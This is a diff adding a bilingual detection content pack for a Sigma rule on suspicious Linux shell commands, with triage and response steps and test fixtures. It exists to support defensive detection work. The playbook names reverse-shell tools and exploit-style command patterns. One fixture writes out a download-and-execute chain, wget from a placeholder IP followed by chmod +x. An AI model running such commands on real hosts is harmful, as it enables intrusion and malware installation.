@@ -1,0 +1,116 @@
+{
+  "rule": {
+    "id": "2aa1440c-9ae9-4d92-84a7-a9e5f5e31695",
+    "title": "Suspicious Activity in Shell Commands",
+    "level": "high",
+    "status": "test",
+    "author": "Florian Roth (Nextron Systems)",
+    "path": "linux/builtin/lnx_shell_susp_commands.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/linux/builtin/lnx_shell_susp_commands.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1059.004"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Una línea de log de Linux contiene un patrón de comando de shell visto en exploits públicos y droppers de malware, como descarga y ejecución, reverse shells, abuso de SUID o desactivación del firewall.",
+      "what_it_detects": "Coincidencias de palabras clave en logs de Linux (syslog, sudo, historial de shell) con comandos típicos de exploits: wget canalizado a sh/bash/perl o seguido de chmod +x, listeners con socat/nc, python pty.spawn, servidores HTTP de Python, decodificación base64 hacia /tmp, chmod u+s, persistencia en rc.local y 'service iptables stop'.",
+      "why_it_matters": "Estas cadenas provienen de campañas contra Apache Struts, módulos de Metasploit y malware para Linux. Una coincidencia suele indicar ejecución de comandos post-explotación mediante una shell Unix (ATT&CK T1059.004), normalmente antes de descargar un payload, escalar privilegios o persistir.",
+      "triage_steps": [
+        "Lea la línea de log completa e identifique qué palabra clave coincidió: descarga y ejecución, listener/reverse shell, SUID, decodificación base64 o detención del firewall.",
+        "Identifique el usuario y el host. Comandos de cuentas de servicio como www-data, tomcat o nginx sugieren explotación de una aplicación web.",
+        "Pivotee en el mismo host +/- 15 minutos: logs de sudo, auth, servidor web y procesos para ver el proceso padre y comandos posteriores.",
+        "Extraiga URLs, IPs y rutas de archivos (por ejemplo en /tmp); verifique reputación, si los archivos existen y obtenga sus hashes.",
+        "Revise persistencia: cambios en /etc/rc.local, cron, unidades systemd, nuevos binarios SUID y authorized_keys.",
+        "Busque conexiones salientes hacia las IPs extraídas y los mismos indicadores en otros hosts.",
+        "Revise alertas previas del host y del usuario, en especial de explotación web o fuerza bruta."
+      ],
+      "false_positives": [
+        "Administradores que ejecutan python -m http.server para compartir archivos temporalmente.",
+        "Pruebas de penetración o ejercicios de red team que usan socat, nc o pty.spawn.",
+        "Scripts de instalación que descargan con wget y aplican chmod +x al archivo descargado."
+      ],
+      "response_steps": [
+        "Confirme con el responsable del sistema si el comando estaba autorizado; busque un ticket de cambio o alcance de pentest.",
+        "Si no está autorizado, aísle el host de la red y preserve memoria, contenido de /tmp y logs relevantes.",
+        "Bloquee IPs y dominios extraídos en el perímetro y finalice procesos maliciosos después de recolectar evidencia.",
+        "Elimine archivos descargados, entradas de persistencia y bits SUID inesperados; parchee el servicio explotado.",
+        "Rote las credenciales usadas en el host y monitoréelo de cerca tras restablecer el servicio."
+      ],
+      "severity_rationale": "El nivel alto es adecuado porque estos comandos rara vez son legítimos en producción e indican con fuerza explotación activa o actividad post-explotación."
+    },
+    "en": {
+      "summary": "A Linux log line contains a shell command pattern seen in public exploit code and malware droppers, such as download-and-execute, reverse shells, SUID abuse or firewall shutdown.",
+      "what_it_detects": "Keyword matches in Linux logs (syslog, sudo, shell history) for exploit-style commands: wget piped to sh/bash/perl or followed by chmod +x, socat/nc listeners, python pty.spawn, Python HTTP servers, base64 decoding into /tmp, chmod u+s, rc.local persistence and 'service iptables stop'.",
+      "why_it_matters": "These strings come from Apache Struts exploit campaigns, Metasploit modules and Linux malware. A match often means post-exploitation command execution through a Unix shell (ATT&CK T1059.004), usually right before payload download, privilege escalation or persistence.",
+      "triage_steps": [
+        "Read the full matched log line and identify which keyword fired: download-and-execute, listener/reverse shell, SUID, base64 decoding or firewall stop.",
+        "Identify the executing user and host. Commands from service accounts such as www-data, tomcat or nginx point to web application exploitation.",
+        "Pivot on the same host +/- 15 minutes: sudo, auth, web server and process logs for the parent process and follow-on commands.",
+        "Extract URLs, IPs and file paths (for example /tmp files) from the command; check reputation and whether files still exist, then collect their hashes.",
+        "Check for persistence: changes to /etc/rc.local, cron, systemd units, new SUID binaries and authorized_keys.",
+        "Look for outbound connections from the host to extracted IPs and for the same indicators on other hosts.",
+        "Review earlier alerts for this host and user, especially web exploitation or brute-force alerts."
+      ],
+      "false_positives": [
+        "Administrators running python -m http.server to share files temporarily.",
+        "Penetration tests or red team exercises using socat, nc or pty.spawn.",
+        "Install scripts that download with wget and run chmod +x on the downloaded file."
+      ],
+      "response_steps": [
+        "Confirm with the system owner whether the command was authorized; check for a change ticket or pentest scope.",
+        "If unauthorized, isolate the host from the network and preserve memory, /tmp contents and relevant logs.",
+        "Block extracted IPs and domains at the perimeter, and kill malicious processes after evidence collection.",
+        "Remove dropped files, persistence entries and unexpected SUID bits; patch the exploited service.",
+        "Rotate credentials used on the host and monitor it closely after restoring service."
+      ],
+      "severity_rationale": "High fits because these commands are rarely legitimate in production and strongly indicate active exploitation or post-exploitation activity."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "Web service account runs a download-and-execute chain via sudo (matches '*wget *; chmod +x*').",
+        "event": {
+          "message": "Oct 25 14:03:12 web-01 sudo: www-data : TTY=unknown ; PWD=/tmp ; USER=root ; COMMAND=/bin/sh -c cd /tmp; wget http://203.0.113.10/x.sh; chmod +x x.sh",
+          "host": "web-01",
+          "program": "sudo"
+        }
+      },
+      {
+        "description": "Base64 payload decoded through a pipe into /tmp (matches '* | base64 -d *').",
+        "event": {
+          "message": "Oct 25 14:05:40 bastion-01 sudo:   jperez : TTY=pts/1 ; PWD=/home/jperez ; USER=root ; COMMAND=/bin/bash -c echo ZWNobyBoaQ== | base64 -d > /tmp/run.sh",
+          "host": "bastion-01",
+          "program": "sudo"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Legitimate wget download to /opt without chmod +x or piping to a shell.",
+        "event": {
+          "message": "Oct 25 15:10:02 bastion-01 sudo:   jperez : TTY=pts/1 ; PWD=/home/jperez ; USER=root ; COMMAND=/usr/bin/wget -q https://example.com/release.tar.gz -O /opt/app/release.tar.gz",
+          "host": "bastion-01",
+          "program": "sudo"
+        }
+      },
+      {
+        "description": "base64 decoding of a file in the home directory, not piped and not in /tmp.",
+        "event": {
+          "message": "Oct 25 15:12:45 bastion-01 sudo:   jperez : TTY=pts/1 ; PWD=/home/jperez ; USER=root ; COMMAND=/usr/bin/base64 -d /home/jperez/backup.b64",
+          "host": "bastion-01",
+          "program": "sudo"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
